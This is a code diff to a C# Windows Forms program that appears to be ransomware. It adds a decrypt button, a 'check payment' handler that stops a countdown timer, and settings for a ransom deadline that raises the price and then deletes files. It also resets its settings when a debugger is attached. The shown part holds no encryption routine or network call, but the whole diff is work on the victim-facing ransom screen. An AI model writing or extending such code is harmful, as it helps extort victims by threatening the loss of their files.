@@ -18,6 +18,7 @@ namespace S4VEtheD4TE
 
             timer1.Enabled = true;
 
+            // Resets settings on debug mode
             if (Debugger.IsAttached)
             {
                 Properties.Settings.Default.Reset();
@@ -61,6 +62,12 @@ namespace S4VEtheD4TE
                 // sets durations
                 duration1 = Properties.Settings.Default.TimePriceRaise;
                 duration2 = Properties.Settings.Default.TimeDeleteFiles;
+            }
+
+            // Check if timer is enabled
+            if (!Properties.Settings.Default.TimerEnabled)
+            {
+                timer1.Enabled = false;
             }
         }
 
@@ -123,6 +130,17 @@ namespace S4VEtheD4TE
             Properties.Settings.Default.Save();
 
             //e.Cancel = true;
+        }
+
+        private void buttonDecrypt_Click(object sender, EventArgs e)
+        {
+            DecryptForm.GetForm.Show();
+        }
+
+        private void buttonCheckPayment_Click(object sender, EventArgs e)
+        {
+            timer1.Enabled = false;
+            Properties.Settings.Default.TimerEnabled = false;
         }
     }
 }
